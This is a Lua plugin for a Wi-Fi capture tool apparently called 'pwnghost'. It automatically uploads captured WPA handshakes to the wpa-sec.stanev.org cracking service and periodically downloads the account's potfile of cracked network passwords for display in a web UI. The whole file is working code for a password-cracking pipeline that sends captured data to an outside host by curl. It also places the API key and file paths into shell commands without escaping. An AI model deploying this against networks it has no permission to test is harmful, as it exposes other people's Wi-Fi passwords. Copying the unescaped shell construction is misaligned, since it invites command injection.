-- wpa_sec plugin: uploads captured handshakes to wpa-sec.stanev.org for
-- hash-cracking-as-a-service, and periodically downloads the account's
-- cracked-potfile so the web UI can show recovered passwords.
-- Hooks: on_ready, on_handshake, on_epoch. Available globals on_handshake:
-- `handshake_bssid`, `handshake_ssid`, `handshake_path` (.hc22000) and
-- `handshake_pcap_path` (raw .pcapng).

local CONFIG_PATH = "/etc/pwnghost/config.toml"
-- The Rust web layer reads this file for `GET /api/wpa-sec/cracked` (it
-- parses the raw wpa-sec potfile format server-side). Keep in sync with
-- `AppState::wpa_sec_potfile` in crates/ui/web/src/api.rs.
local POTFILE_PATH = "/var/tmp/pwnghost/wpa-sec/potfile"
-- Re-download the potfile roughly every this-many epochs (cheap, and only
-- when an api_key is set). Startup also downloads once via on_ready.
local POTFILE_EVERY_EPOCHS = 60

local initialized = false
local api_key = nil
local api_url = "https://wpa-sec.stanev.org/"

local function read_config_value(section, key)
  local f = io.open(CONFIG_PATH, "r")
  if not f then
    return nil
  end
  local content = f:read("*a")
  f:close()

  local section_start = content:find("%[" .. section:gsub("%.", "%%.") .. "%]")
  if not section_start then
    return nil
  end

  local body_start = content:find("\n", section_start) or section_start
  local next_section = content:find("\n%[", body_start)
  local body = content:sub(body_start, next_section or #content)

  return body:match(key .. '%s*=%s*"([^"]*)"') or body:match(key .. "%s*=%s*([%d%.]+)")
end

local function init()
  if initialized then
    return
  end
  initialized = true

  api_key = read_config_value("plugins.wpa_sec", "api_key")
  api_url = read_config_value("plugins.wpa_sec", "api_url") or api_url

  if not api_key or api_key == "" then
    io.stderr:write("[wpa_sec] no api_key configured under [plugins.wpa_sec]; uploads/downloads disabled\n")
  else
    io.stderr:write("[wpa_sec] ready, will upload handshakes to " .. api_url .. "\n")
  end
end

-- Download the account's cracked potfile to POTFILE_PATH. wpa-sec's `?api&dl=1`
-- endpoint returns colon-separated `bssid:station:ssid:password` lines; the
-- Rust web layer parses that format for the UI, so we just store it verbatim.
local function download_potfile()
  if not api_key or api_key == "" then
    return
  end
  os.execute("mkdir -p /var/tmp/pwnghost/wpa-sec 2>/dev/null")
  local tmp = POTFILE_PATH .. ".tmp"
  local cmd = string.format(
    "curl -s -m 60 -o %s -w '%%{http_code}' --cookie 'key=%s' '%s?api&dl=1' 2>/dev/null",
    tmp, api_key, api_url)
  local handle = io.popen(cmd)
  local http_code = handle and handle:read("*a")
  if handle then
    handle:close()
  end
  if http_code == "200" then
    -- Atomic-ish swap so the web layer never reads a half-written file.
    os.rename(tmp, POTFILE_PATH)
    io.stderr:write("[wpa_sec] refreshed cracked potfile\n")
  else
    os.remove(tmp)
    io.stderr:write(string.format("[wpa_sec] potfile download failed (http=%s)\n", tostring(http_code)))
  end
end

function on_ready()
  init()
  download_potfile()
  return true
end

function on_epoch()
  init()
  -- `epoch` is injected as a Lua global by the plugin host each epoch.
  if type(epoch) == "number" and epoch > 0 and (epoch % POTFILE_EVERY_EPOCHS) == 0 then
    download_potfile()
  end
  return true
end

function on_handshake()
  init()

  if not api_key or api_key == "" then
    return true
  end

  -- wpa-sec expects the RAW capture (it runs its own extraction server-side),
  -- so upload the .pcapng, not the already-converted .hc22000. Fall back to
  -- whatever `handshake_path` points at only if no pcap path was provided.
  local upload_path = handshake_pcap_path
  if not upload_path or upload_path == "" then
    upload_path = handshake_path
  end

  local cmd = string.format(
    "curl -s -m 30 -o /dev/null -w '%%{http_code}' --cookie 'key=%s' -F 'file=@%s' '%s' 2>/dev/null",
    api_key, upload_path, api_url)

  local handle = io.popen(cmd)
  local http_code = handle and handle:read("*a")
  if handle then
    handle:close()
  end

  if http_code == "200" then
    io.stderr:write(string.format("[wpa_sec] uploaded handshake for %s (%s)\n",
      tostring(handshake_ssid), tostring(handshake_bssid)))
  else
    io.stderr:write(string.format("[wpa_sec] upload failed for %s (http=%s)\n",
      tostring(upload_path), tostring(http_code)))
  end

  return true
end
